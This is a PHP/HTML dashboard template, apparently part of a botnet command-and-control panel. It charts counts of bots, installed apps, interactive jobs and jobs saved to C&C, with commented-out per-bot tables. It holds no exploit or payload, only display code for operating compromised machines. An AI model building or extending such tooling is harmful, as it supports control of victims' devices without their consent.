<?php //include('includes/header.php'); ?>

  <!-- Start Breadcrumbs -->
  <div class="header-bottom">
    <ul id="breadcrumbs">
      <li><a href="<?php echo base_url(); ?>login/manage">Dashboard</a> &raquo;</li>
    </ul>    
  </div>
  <!-- End Breadcrumbs -->
</div>








<!-- start page header -->
<div id="page-wrapper">
  <div class="page">

<?php include('includes/sidebar.php'); ?>

    <!-- Star Page Content  -->
    <div id="page-content">

      <!-- Start Page Header -->
      <div id="page-header">
        <h1>Dashboard</h1>
      </div>
      <!-- End Page Header -->

      <!-- Start Grid -->
      <div class="container_12">


          


        <!-- Start Table -->
        <div class="grid_12">
          <div class="box-header">  <span class="fr"></div>
          <div class="box stats">

              
            <script type="text/javascript" src="https://www.google.com/jsapi"></script>
            <script type="text/javascript">
              google.load("visualization", "1.1", {packages:["bar"]});
              google.setOnLoadCallback(drawStuff);

              function drawStuff() {
                var data = new google.visualization.arrayToDataTable([
                  ['Move', 'Count'],
                  ["Bots", <?php echo $this->bot_model->countBots(); ?>],                  
                  ["Installed Apps", <?php echo $this->app_model->countAllApps('2'); ?>],
                  ["Interactive Jobs", <?php echo $this->job_model->countAllInteractiveJobs(); ?>],
                  ["Jobs Saved to C&C", <?php echo $this->job_model->countAllJobSavedToCC(); ?>],
                  ["Jobs Saved to Bots", <?php echo $this->job_model->countAllJobsOnBot(); ?>]
                ]);

                var options = {
                  title: 'Network Health',
                  width: 900,
                  legend: { position: 'none' },
                  chart: { subtitle: 'Botnet Health by Numbers' },
                  axes: {
                    x: {
                      0: { side: 'top', label: 'Botnet Statistics'} // Top x-axis.
                    }
                  },
                  bar: { groupWidth: "90%" }
                };

                var chart = new google.charts.Bar(document.getElementById('top_x_div'));
                // Convert the Classic options to Material options.
                chart.draw(data, google.charts.Bar.convertOptions(options));
              };
            </script>              
              
            <div id="top_x_div" style="width: 100%; height: 400px"></div> 
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
           
<!--            <table cellspacing="0" cellpadding="0" width="100%" id="stats" style="display: none;">
              <thead>
                <tr>
                  <td>&nbsp;fff</td>
                  <?php foreach($bot_data->result() as $bot): ?>
                    <th scope="col"><?php echo $bot->bot_name; ?></th>
                  <?php endforeach;?>
                </tr>
              </thead>
              <tbody>

                <?php //--------------------?>
                <tr style="background-color: rgb(251, 251, 251);">
                  <th scope="row">Installed Apps</th>
                  <?php foreach($bot_data->result() as $bot): ?>
                    <td><?php echo $this->app_model->countApps('2', $bot->bot_key); ?></td>
                  <?php endforeach;?>
                </tr>


                 <tr>
                  <th scope="row">Interactive Jobs</th>
                  <?php foreach($bot_data->result() as $bot): ?>
                    <td><?php echo $this->job_model->countAllInteractiveJobs($bot->bot_key); ?></td>
                   <? endforeach; ?>
                </tr>

                <tr>
                  <th scope="row">Jobs Saved on Bot</th>
                  <?php foreach($bot_data->result() as $bot): ?>
                    <td><?php echo $this->job_model->countAllJobsOnBot($bot->bot_key); ?></td>
                   <? endforeach; ?>
                </tr>


                <tr>
                  <th scope="row">Jobs Saved to C&C</th>
                  <?php foreach($bot_data->result() as $bot): ?>
                    <td><?php echo $this->job_model->countAllJobSavedToCC($bot->bot_key); ?></td>
                   <? endforeach; ?>
                </tr>

                <tr>
                  <th scope="row">Total # Jobs</th>
                  <?php foreach($bot_data->result() as $bot): ?>
                    <td><?php echo $this->job_model->countAllCompletedJobs($bot->bot_key); ?></td>
                  <?php endforeach;?>
                </tr>


                <?php //-------------------------?>
              </tbody>
            </table>-->
            
              
            
<!--<script type="text/javascript">              
var chart1; // globally available
$(document).ready(function() {

Highcharts.setOptions({
                    colors: ['#00b3c8', '#c8b47d', '#f8a100']
                });

      chart1 = new Highcharts.Chart({

         chart: {

            renderTo: 'container',

            type: 'bar'

         },
                 credits: {
                enabled: false
        }, 

         title: {

            text: ''

         },

         xAxis: {

            categories: [<?php foreach($bot_data->result() as $bot): ?> <?php echo "'".$bot->bot_name."', "; ?> <?php endforeach; ?>] 

         },

         yAxis: {

            title: {

               text: ''

            }

         },

         series: [{

            name: 'Installed Apps',

            data: [<?php foreach($bot_data->result() as $bot): ?> <?php echo $this->app_model->countApps('2', $bot->bot_key).', '; ?> <?php endforeach; ?>]

         }, {

            name: 'Completed Jobs',

            data: [<?php foreach($bot_data->result() as $bot): ?> <?php echo $this->job_model->countAllCompletedJobs($bot->bot_key).", "; ?> <?php endforeach; ?>] 

         }, {

            name: 'Jobs Saved to C&C',

            data: [<?php foreach($bot_data->result() as $bot): ?> <?php echo $this->job_model->countAllJobSavedToCC($bot->bot_key).", "; ?> <?php endforeach; ?>]

         } ]

      });

   });  
</script>      
              
            <div id="container" style="width: 100%; height: 400px"></div> 
            -->
          </div>
        </div>
        <!-- End Table -->










        




        <br class="cl" />
        <!-- End Formatting -->



        
        <!-- End Grid -->
      </div>
      <!-- End Page Wrapper -->
    </div>
    <!-- End Page Content  -->
  </div>
</div>
